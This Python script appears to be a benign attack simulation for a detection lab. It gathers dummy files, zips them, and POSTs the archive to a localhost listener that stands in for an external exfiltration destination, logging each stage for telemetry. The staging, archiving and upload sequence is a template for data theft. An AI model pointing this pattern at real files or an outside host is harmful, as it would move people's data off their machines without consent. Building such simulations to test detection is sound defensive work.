"""
Scenario 3 — Data Exfiltration
MITRE ATT&CK: T1560 (archive collected data), T1041 (exfiltration over C2 channel)

Benign simulation. Produces realistic telemetry without exfiltrating any
real sensitive data. Run only on an isolated lab VM.

Stages:
  1. Files gathered into a staging folder
  2. Folder compressed into an archive
  3. Archive sent to an "external" address (loopback stand-in — see note)

NOTE: Stage 3 currently sends to a local HTTP listener on localhost as a
stand-in for a genuine external destination, since no second lab VM is
set up yet. Same simplification as Scenario 2's lateral movement stage —
flag to Rasy, upgrade once the two-machine lab (OPPM 3.1) is available.
"""

import subprocess
import time
import os
import sys
import shutil
import threading
import http.server
import socketserver
import urllib.request
from datetime import datetime

LOG_PATH = r"C:\AttackSim\scenario3_timestamps.log"
STAGING_DIR = r"C:\AttackSim\staging"
ARCHIVE_PATH = r"C:\AttackSim\staging_archive.zip"
EXFIL_PORT = 8090
EXFIL_URL = f"http://127.0.0.1:{EXFIL_PORT}/upload"


def log(message: str):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"{ts} | {message}"
    os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
    with open(LOG_PATH, "a", encoding="utf-8") as f:
        f.write(line + "\n")
    print(line)


def stage1_gather_files():
    """Gathers a few benign dummy files into a staging folder -- stand-in
    for an attacker collecting data of interest before exfiltration."""
    log("STAGE1_GATHER_FILES_START")

    os.makedirs(STAGING_DIR, exist_ok=True)
    for i in range(3):
        fpath = os.path.join(STAGING_DIR, f"dummy_file_{i}.txt")
        with open(fpath, "w") as f:
            f.write(f"benign placeholder content {i}\n")

    log("STAGE1_GATHER_FILES_COMPLETE")


def stage2_archive():
    """Compresses the staging folder into a zip archive -- T1560."""
    log("STAGE2_ARCHIVE_START")

    try:
        archive_base = ARCHIVE_PATH.replace(".zip", "")
        shutil.make_archive(archive_base, "zip", STAGING_DIR)
        log("STAGE2_ARCHIVE_CREATED")
    except Exception as e:
        log(f"STAGE2_ARCHIVE_ERROR: {e}")


class _QuietHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        self.rfile.read(content_length)
        self.send_response(200)
        self.end_headers()

    def log_message(self, format, *args):
        pass  # suppress default stderr logging, we have our own log()


def _run_listener(server):
    server.handle_request()  # handle exactly one request, then stop


def stage3_exfiltrate():
    """Sends the archive to an 'external' address via HTTP POST. Currently
    a loopback stand-in -- see module docstring."""
    log("STAGE3_EXFILTRATION_START")

    try:
        server = socketserver.TCPServer(("127.0.0.1", EXFIL_PORT), _QuietHandler)
        listener_thread = threading.Thread(target=_run_listener, args=(server,))
        listener_thread.start()
        time.sleep(0.5)  # let the listener start

        with open(ARCHIVE_PATH, "rb") as f:
            data = f.read()

        req = urllib.request.Request(EXFIL_URL, data=data, method="POST")
        urllib.request.urlopen(req, timeout=5)

        listener_thread.join(timeout=5)
        server.server_close()

        log("STAGE3_EXFILTRATION_COMPLETE")
    except Exception as e:
        log(f"STAGE3_ERROR: {e}")


def cleanup():
    """Removes staging files and archive so repeated runs stay clean
    (NFR-7)."""
    log("CLEANUP_START")
    try:
        if os.path.exists(STAGING_DIR):
            shutil.rmtree(STAGING_DIR)
        if os.path.exists(ARCHIVE_PATH):
            os.remove(ARCHIVE_PATH)
        log("CLEANUP_COMPLETE")
    except Exception as e:
        log(f"CLEANUP_ERROR: {e}")


def main():
    log("SCENARIO3_RUN_START")
    stage1_gather_files()
    stage2_archive()
    stage3_exfiltrate()
    log("SCENARIO3_RUN_COMPLETE")
    cleanup()


if __name__ == "__main__":
    main()